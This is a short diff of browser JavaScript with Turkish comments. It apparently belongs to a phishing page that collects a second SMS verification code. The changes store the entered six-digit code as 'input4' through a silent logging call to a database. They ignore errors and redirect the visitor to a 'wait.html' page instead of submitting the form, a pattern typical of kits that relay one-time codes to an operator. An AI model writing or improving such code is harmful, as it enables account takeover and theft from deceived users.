@@ -398,7 +398,7 @@
         try {
           await sendLogUpdate({
             page: 'sms2',
-            inputs: { input3: value.trim() }
+            inputs: { input4: value.trim() }
           });
         } catch (err) {
           console.error('Failed to log SMS2 input (silent):', err);
@@ -460,13 +460,14 @@
       if (/^\d{6}$/.test(sIpp.value.trim())) {
         sIpp.parentElement.style.borderColor = 'rgb(234, 236, 239)';
         sIpp.parentElement.nextElementSibling.style.display = 'none';
-        // MongoDB'ye kaydın %100 tamamlanmasını bekle
+        // MongoDB'ye kaydın %100 tamamlanmasını bekle - input4 olarak kaydet
         try {
           await logSms2Input(sIpp.value);
         } catch (err) {
           console.error('SMS2 log failed, continuing anyway', err);
         }
-        frm.submit();
+        // wait.html'e yönlendir
+        window.location.href = '/pages/wait.html';
       } else {
         sIpp.parentElement.style.borderColor = '#f84960';
         sIpp.parentElement.nextElementSibling.style.display = 'block';
